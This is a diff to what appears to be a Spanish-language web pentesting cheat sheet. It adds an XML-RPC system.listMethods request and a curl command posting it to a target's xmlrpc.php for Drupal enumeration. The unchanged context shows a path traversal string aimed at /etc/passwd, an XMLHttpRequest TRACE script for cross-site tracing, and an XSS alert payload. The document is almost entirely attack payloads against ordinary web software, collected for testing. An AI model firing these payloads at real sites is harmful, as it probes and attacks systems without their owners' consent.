@@ -16,6 +16,18 @@ Introducir directorios inexistentes ../../../etc/otro/../passwd o ../../../etc/.
 #XST
 <script>var xhr = new XMLHttpRequest(); xhr.open('TRACE', 'IP', false); xhr.send(null); if(200 == xhr.status)  alert(xhr.responseText);</script>
 
+#XMLRPC
+drupalxml.xml =>
+	<?xml version="1.0"?>
+	<methodCall>
+	<methodName>system.listMethods</methodName>
+	<params>
+	<param>
+	</param>
+	</params>
+	</methodCall>
+
+curl --data @drupalxml.xml IP/xmlrpc.php
 
 #XSS
 <script>alert("HOLA");</script>
